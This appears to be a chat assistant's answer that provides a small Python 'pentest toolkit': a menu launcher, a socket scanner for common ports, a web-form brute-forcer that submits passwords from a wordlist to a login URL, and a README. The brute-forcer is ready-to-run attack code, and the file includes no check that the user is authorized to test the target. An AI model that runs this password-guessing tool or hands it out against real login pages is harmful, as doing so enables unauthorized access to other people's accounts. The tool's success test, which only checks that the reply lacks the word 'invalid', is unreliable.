 Folder Structure:
Copy
pentest_toolkit/
│
├── modules/
│   ├── port_scanner.py
│   ├── brute_forcer.py
│
├── toolkit_launcher.py
│
└── README.md
1. toolkit_launcher.py (Main Launcher)
python
Copy
from modules import port_scanner, brute_forcer

def main_menu():
    print("="*50)
    print("         Penetration Testing Toolkit")
    print("="*50)
    print("Select a module to run:")
    print("1. Port Scanner")
    print("2. Brute Forcer (Basic)")
    print("3. Exit")

    choice = input("\nEnter your choice: ").strip()

    if choice == "1":
        target = input("Enter target IP address: ").strip()
        port_scanner.scan_ports(target)
    elif choice == "2":
        login_url = input("Enter login URL: ").strip()
        username_field = input("Enter username field name: ").strip()
        password_field = input("Enter password field name: ").strip()
        username = input("Enter username to brute-force: ").strip()
        wordlist_path = input("Enter path to password wordlist: ").strip()
        brute_forcer.brute_force(login_url, username_field, password_field, username, wordlist_path)
    elif choice == "3":
        print("Exiting toolkit. Goodbye!")
        exit(0)
    else:
        print("Invalid choice. Please try again.")

if __name__ == "__main__":
    while True:
        main_menu()
2. modules/port_scanner.py (Port Scanning Module)
python
Copy
import socket

def scan_ports(target):
    """
    Scans common ports on a given target IP address.
    """
    print(f"\n[*] Starting port scan on {target}...\n")
    common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 3389]

    for port in common_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(f"[+] Port {port} is OPEN")
            sock.close()
        except Exception as e:
            print(f"Error scanning port {port}: {e}")
    
    print("\n[*] Port scan completed.\n")
3. modules/brute_forcer.py (Basic Brute Force Module)
python
Copy
import requests

def brute_force(login_url, username_field, password_field, username, wordlist_path):
    """
    Performs a simple brute-force attack using a password wordlist.
    """
    print("\n[*] Starting brute-force attack...\n")

    try:
        with open(wordlist_path, "r") as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print("[-] Wordlist file not found.")
        return

    for password in passwords:
        data = {username_field: username, password_field: password}
        response = requests.post(login_url, data=data)

        if "invalid" not in response.text.lower():  # Simple check, can be improved
            print(f"[+] Successful login: {username}:{password}")
            return

    print("\n[-] Brute-force attack completed. No valid password found.\n")
4. README.md (Documentation 📜)
markdown
Copy
# Penetration Testing Toolkit

## Overview
A Python-based modular penetration testing toolkit containing:
- **Port Scanner**: Scan common open ports on a target.
- **Brute Forcer**: Attempt login brute-forcing using a password wordlist.

---

## Folder Structure
pentest_toolkit/ ├── modules/ │ ├── port_scanner.py │ ├── brute_forcer.py ├── toolkit_launcher.py └── README.md

yaml
Copy

---

## How to Run

1. Install required libraries:
    ```bash
    pip install requests
    ```

2. Run the launcher:
    ```bash
    python toolkit_launcher.py
    ```

3. Choose the module you want to use.

---

## Modules

### 1. Port Scanner
- Scans the target IP for common ports (21, 22, 80, 443, etc.)
- Fast and simple.
- Result: List of open ports.

### 2. Brute Forcer
- Sends POST requests with usernames and passwords from a wordlist.
- Detects if login is successful based on response text.
- Result: Valid credentials if found.

---

## Future Improvements (Todo )
- Add SSH/FTP brute forcing modules.
- Add full TCP/UDP port scanning.
- Add vulnerability scanner.
- Add report generation (save results to files).
- Threading for faster scanning.

---
 Features:
Super easy menu to select modules

Clean and modular code

Each tool can be expanded separately later

Proper documentation

Python3 based lightweight toolkit

 Requirements:
bash
Copy
pip install requests
(no other special libraries needed!)

 Example Usage:
Terminal:

bash
Copy
$ python toolkit_launcher.py
Menu will come -> Choose "1" for Port Scanner -> Enter IP
Choose "2" for Brute Forcer -> Enter login page, username, and wordlist.

